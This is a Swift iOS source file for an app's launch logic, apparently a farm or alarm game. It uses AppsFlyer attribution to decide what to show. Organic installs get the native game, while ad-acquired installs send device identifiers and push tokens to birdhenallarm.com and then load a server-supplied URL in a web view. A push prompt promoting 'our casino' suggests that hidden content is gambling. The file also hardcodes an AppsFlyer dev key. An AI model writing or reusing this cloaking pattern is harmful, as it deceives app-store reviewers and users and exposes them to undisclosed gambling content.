import SwiftUI
import FirebaseCore
import Combine
import Network
import FirebaseMessaging
import AppsFlyerLib

final class BootstrapOrchestrator: ObservableObject {
    
    @Published var appPhase: AppPhase = .initializing
    @Published var targetWebURL: URL?
    @Published var shouldShowPushPrompt = false
    
    private var attributionPayload: [AnyHashable: Any] = [:]
    private var deepLinkCache: [AnyHashable: Any] = [:]
    private var subscriptions = Set<AnyCancellable>()
    private let networkMonitor = NWPathMonitor()
    
    private var isFirstEverLaunch: Bool {
        !UserDefaults.standard.bool(forKey: "hasEverRunBefore")
    }
    
    enum AppPhase {
        case initializing
        case webContainer
        case legacyMode
        case noConnection
    }
    
    init() {
        observeAttributionEvents()
        startNetworkObservation()
    }
    
    deinit {
        networkMonitor.cancel()
    }
    
    // MARK: - Наблюдение за атрибуцией и диплинками
    private func observeAttributionEvents() {
        NotificationCenter.default.publisher(for: Notification.Name("ConversionDataReceived"))
            .compactMap { $0.userInfo?["conversionData"] as? [AnyHashable: Any] }
            .sink { [weak self] payload in
                self?.attributionPayload = payload
                self?.decideLaunchStrategy()
            }
            .store(in: &subscriptions)
        
        NotificationCenter.default.publisher(for: Notification.Name("deeplink_values"))
            .compactMap { $0.userInfo?["deeplinksData"] as? [AnyHashable: Any] }
            .sink { [weak self] data in
                self?.deepLinkCache = data
            }
            .store(in: &subscriptions)
    }
    
    @objc private func decideLaunchStrategy() {
        guard !attributionPayload.isEmpty else {
            fallbackToCachedOrLegacy()
            return
        }
        
        if UserDefaults.standard.string(forKey: "app_mode") == "Funtik" {
            switchToLegacy()
            return
        }
        
        if isFirstEverLaunch,
           attributionPayload["af_status"] as? String == "Organic" {
            initiateOrganicVerification()
            return
        }
        
        if let temp = UserDefaults.standard.string(forKey: "temp_url"),
           let url = URL(string: temp) {
            targetWebURL = url
            moveTo(.webContainer)
            return
        }
        
        if shouldRequestPushPermission() {
            shouldShowPushPrompt = true
        } else {
            requestRemoteConfiguration()
        }
    }
    
    // MARK: - Мониторинг сети
    private func startNetworkObservation() {
        networkMonitor.pathUpdateHandler = { [weak self] path in
            DispatchQueue.main.async {
                if path.status != .satisfied {
                    self?.handleConnectivityLoss()
                }
            }
        }
        networkMonitor.start(queue: .global())
    }
    
    private func handleConnectivityLoss() {
        let mode = UserDefaults.standard.string(forKey: "app_mode") ?? ""
        if mode == "HenView" {
            moveTo(.noConnection)
        } else {
            switchToLegacy()
        }
    }
    
    // MARK: - Органическая проверка
    private func initiateOrganicVerification() {
        DispatchQueue.main.asyncAfter(deadline: .now() + 5) {
            Task { await self.executeOrganicCheck() }
        }
    }
    
    private func executeOrganicCheck() async {
        let request = OrganicCheckBuilder()
            .appId(AppConstants.appsFlyerAppID)
            .devKey(AppConstants.appsFlyerDevKey)
            .deviceUID(AppsFlyerLib.shared().getAppsFlyerUID())
        
        guard let url = request.finalURL() else {
            switchToLegacy()
            return
        }
        
        do {
            let (data, response) = try await URLSession.shared.data(from: url)
            try await processOrganicResponse(data: data, response: response)
        } catch {
            switchToLegacy()
        }
    }
    
    private func processOrganicResponse(data: Data, response: URLResponse) async throws {
        guard
            let http = response as? HTTPURLResponse,
            http.statusCode == 200,
            let json = try JSONSerialization.jsonObject(with: data) as? [String: Any]
        else {
            switchToLegacy()
            return
        }
        
        var enriched: [AnyHashable: Any] = attributionPayload
        for (k, v) in deepLinkCache where enriched[k] == nil {
            enriched[k] = v
        }
        
        await MainActor.run {
            attributionPayload = enriched
            requestRemoteConfiguration()
        }
    }
    
    private func requestRemoteConfiguration() {
        guard let endpoint = URL(string: "https://birdhenallarm.com/config.php") else {
            fallbackToCachedOrLegacy()
            return
        }
        
        var bodyDict = attributionPayload
        bodyDict["af_id"] = AppsFlyerLib.shared().getAppsFlyerUID()
        bodyDict["bundle_id"] = Bundle.main.bundleIdentifier ?? "com.unknown.app"
        bodyDict["os"] = "iOS"
        bodyDict["store_id"] = "id\(AppConstants.appsFlyerAppID)"
        bodyDict["locale"] = Locale.preferredLanguages.first?.prefix(2).uppercased() ?? "EN"
        bodyDict["push_token"] = UserDefaults.standard.string(forKey: "fcm_token") ?? Messaging.messaging().fcmToken
        bodyDict["firebase_project_id"] = FirebaseApp.app()?.options.gcmSenderID
        
        guard let httpBody = try? JSONSerialization.data(withJSONObject: bodyDict) else {
            fallbackToCachedOrLegacy()
            return
        }
        
        var req = URLRequest(url: endpoint)
        req.httpMethod = "POST"
        req.setValue("application/json", forHTTPHeaderField: "Content-Type")
        req.httpBody = httpBody
        
        URLSession.shared.dataTask(with: req) { [weak self] data, response, error in
            guard let self = self,
                  error == nil,
                  let data = data,
                  let json = try? JSONSerialization.jsonObject(with: data) as? [String: Any],
                  let ok = json["ok"] as? Bool, ok,
                  let rawURL = json["url"] as? String,
                  let expires = json["expires"] as? TimeInterval
            else {
                self?.fallbackToCachedOrLegacy()
                return
            }
            
            DispatchQueue.main.async {
                self.saveValidConfiguration(url: rawURL, expiresIn: expires)
                self.targetWebURL = URL(string: rawURL)
                self.moveTo(.webContainer)
            }
        }.resume()
    }
    
    private func saveValidConfiguration(url: String, expiresIn: TimeInterval) {
        UserDefaults.standard.set(url, forKey: "saved_trail")
        UserDefaults.standard.set(expiresIn, forKey: "saved_expires")
        UserDefaults.standard.set("HenView", forKey: "app_mode")
        UserDefaults.standard.set(true, forKey: "hasEverRunBefore")
    }
    
    private func fallbackToCachedOrLegacy() {
        if let cached = UserDefaults.standard.string(forKey: "saved_trail"),
           let url = URL(string: cached) {
            targetWebURL = url
            moveTo(.webContainer)
        } else {
            switchToLegacy()
        }
    }
    
    private func switchToLegacy() {
        UserDefaults.standard.set("Funtik", forKey: "app_mode")
        UserDefaults.standard.set(true, forKey: "hasEverRunBefore")
        moveTo(.legacyMode)
    }
    
    private func shouldRequestPushPermission() -> Bool {
        guard let lastAsk = UserDefaults.standard.object(forKey: "last_notification_ask") as? Date else {
            return true
        }
        return Date().timeIntervalSince(lastAsk) >= 259200
    }
    
    func declinePushPrompt() {
        UserDefaults.standard.set(Date(), forKey: "last_notification_ask")
        shouldShowPushPrompt = false
        requestRemoteConfiguration()
    }
    
    func acceptPushPrompt() {
        UNUserNotificationCenter.current().requestAuthorization(options: [.alert, .sound, .badge]) { [weak self] granted, _ in
            DispatchQueue.main.async {
                UserDefaults.standard.set(granted, forKey: "accepted_notifications")
                if granted {
                    UIApplication.shared.registerForRemoteNotifications()
                } else {
                    UserDefaults.standard.set(true, forKey: "system_close_notifications")
                }
                self?.shouldShowPushPrompt = false
                self?.requestRemoteConfiguration()
            }
        }
    }
    
    private func moveTo(_ phase: AppPhase) {
        DispatchQueue.main.async {
            self.appPhase = phase
        }
    }
}

enum AppConstants {
    static let appsFlyerAppID = "6754697142"
    static let appsFlyerDevKey = "3Rb5ofLZxYQBRctX7q2LSm"
}

private struct OrganicCheckBuilder {
    private let base = "https://gcdsdk.appsflyer.com/install_data/v4.0/"
    private var appId = ""
    private var devKey = ""
    private var deviceUID = ""
    
    func appId(_ value: String) -> Self { updating(\.appId, value) }
    func devKey(_ value: String) -> Self { updating(\.devKey, value) }
    func deviceUID(_ value: String) -> Self { updating(\.deviceUID, value) }
    
    func finalURL() -> URL? {
        guard !appId.isEmpty, !devKey.isEmpty, !deviceUID.isEmpty else { return nil }
        var comp = URLComponents(string: base + "id" + appId)!
        comp.queryItems = [
            URLQueryItem(name: "devkey", value: devKey),
            URLQueryItem(name: "device_id", value: deviceUID)
        ]
        return comp.url
    }
    
    private func updating<T>(_ keyPath: WritableKeyPath<Self, T>, _ value: T) -> Self {
        var copy = self
        copy[keyPath: keyPath] = value
        return copy
    }
}

struct SplashScreen: View {
    @StateObject private var orchestrator = BootstrapOrchestrator()
    
    var body: some View {
        ZStack {
            if orchestrator.appPhase == .initializing || orchestrator.shouldShowPushPrompt {
                SplashView()
            }
            
            if orchestrator.shouldShowPushPrompt {
                PushPermissionOverlay(
                    onAccept: orchestrator.acceptPushPrompt,
                    onDecline: orchestrator.declinePushPrompt
                )
            } else {
                mainContent
            }
        }
    }
    
    @ViewBuilder
    private var mainContent: some View {
        switch orchestrator.appPhase {
        case .initializing:
            EmptyView()
        case .webContainer:
            if orchestrator.targetWebURL != nil {
                RootFarmInterface()
            } else {
                MainView()
            }
        case .legacyMode:
            MainView()
        case .noConnection:
            NoInternetView()
        }
    }
}

struct SplashView: View {
    var body: some View {
        GeometryReader { proxy in
            let landscape = proxy.size.width > proxy.size.height
            ZStack {
                Image(landscape ? "alarm_notification_bg_land" : "loading_bg")
                    .resizable()
                    .scaledToFill()
                    .frame(width: proxy.size.width, height: proxy.size.height)
                    .ignoresSafeArea()
                
                VStack {
                    Spacer()
                    Text("LOADING")
                        .font(.custom("AlfaSlabOne-Regular", size: 48))
                        .foregroundColor(.white)
                        .shadow(color: Color(hex: "#456CE1"), radius: 1, x: -1, y: 0)
                        .shadow(color: Color(hex: "#456CE1"), radius: 1, x: 1, y: 0)
                        .shadow(color: Color(hex: "#456CE1"), radius: 1, x: 0, y: 1)
                        .shadow(color: Color(hex: "#456CE1"), radius: 1, x: 0, y: -1)
                    Spacer().frame(height: 80)
                }
            }
        }
        .ignoresSafeArea()
    }
}

struct NoInternetView: View {
    var body: some View {
        GeometryReader { proxy in
            let landscape = proxy.size.width > proxy.size.height
            ZStack {
                Image(landscape ? "alarm_notification_bg_land" : "loading_bg")
                    .resizable()
                    .scaledToFill()
                    .frame(width: proxy.size.width, height: proxy.size.height)
                    .ignoresSafeArea()
                
                VStack {
                    Image("internet_plaka")
                        .resizable()
                        .frame(width: 300, height: 280)
                }
            }
        }
        .ignoresSafeArea()
    }
}

struct PushPermissionOverlay: View {
    let onAccept: () -> Void
    let onDecline: () -> Void
    
    var body: some View {
        GeometryReader { proxy in
            let landscape = proxy.size.width > proxy.size.height
            ZStack {
                Image(landscape ? "alarm_notification_bg_land" : "alarm_notifications_bg_port")
                    .resizable()
                    .scaledToFill()
                    .frame(width: proxy.size.width, height: proxy.size.height)
                    .ignoresSafeArea()
                
                VStack(spacing: landscape ? 5 : 10) {
                    Spacer()
                    Text("Allow notifications about bonuses and promos".uppercased())
                        .font(.custom("AlfaSlabOne-Regular", size: 18))
                        .foregroundColor(.white)
                        .multilineTextAlignment(.center)
                        .padding(.horizontal, 30)
                        .shadow(color: Color(hex: "#456CE1"), radius: 1, x: -1, y: 0)
                        .shadow(color: Color(hex: "#456CE1"), radius: 1, x: 1, y: 0)
                        .shadow(color: Color(hex: "#456CE1"), radius: 1, x: 0, y: 1)
                        .shadow(color: Color(hex: "#456CE1"), radius: 1, x: 0, y: -1)
                    
                    Text("Stay tuned with best offers from our casino")
                        .font(.custom("AlfaSlabOne-Regular", size: 15))
                        .foregroundColor(.white)
                        .multilineTextAlignment(.center)
                        .padding(.horizontal, 52)
                        .padding(.top, 4)
                    
                    Button(action: onAccept) {
                        Image("btn_app")
                            .resizable()
                            .frame(height: 60)
                    }
                    .frame(width: 350)
                    .padding(.top, 12)
                    
                    Button("SKIP", action: onDecline)
                        .font(.custom("AlfaSlabOne-Regular", size: 16))
                        .foregroundColor(.white)
                    
                    Spacer().frame(height: landscape ? 30 : 30)
                }
                .padding(.horizontal, landscape ? 20 : 0)
            }
        }
        .ignoresSafeArea()
    }
}


#Preview {
    PushPermissionOverlay(onAccept: {}, onDecline: {})
}
